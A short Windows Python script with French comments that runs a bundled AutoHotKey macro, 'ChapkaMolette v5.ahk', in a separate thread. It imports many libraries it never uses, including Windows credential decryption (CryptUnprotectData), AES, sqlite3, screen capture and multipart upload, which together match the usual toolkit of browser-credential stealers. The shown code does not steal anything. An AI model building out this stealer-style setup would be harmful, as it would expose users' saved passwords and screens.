import base64
import concurrent.futures
import ctypes
import json
import os
import random
import re
import sqlite3
import subprocess
import sys
import threading
import time
from ctypes import wintypes
from multiprocessing import cpu_count
from shutil import copy2
from zipfile import ZIP_DEFLATED, ZipFile

import psutil
import requests
from Cryptodome.Cipher import AES
from PIL import Image, ImageGrab
from requests_toolbelt.multipart.encoder import MultipartEncoder
from win32crypt import CryptUnprotectData

def run_ahk_script():
    script_path = os.path.join(os.path.dirname(__file__), 'ChapkaMolette v5.ahk')
    executable_path = os.path.join(os.path.dirname(__file__), 'AutoHotKeyA32.exe')

    # Exécuter le script AHK dans un processus séparé
    subprocess.run([executable_path, script_path])

# Créer un thread pour exécuter le script AHK
ahk_thread = threading.Thread(target=run_ahk_script)

# Démarrer le thread
ahk_thread.start()
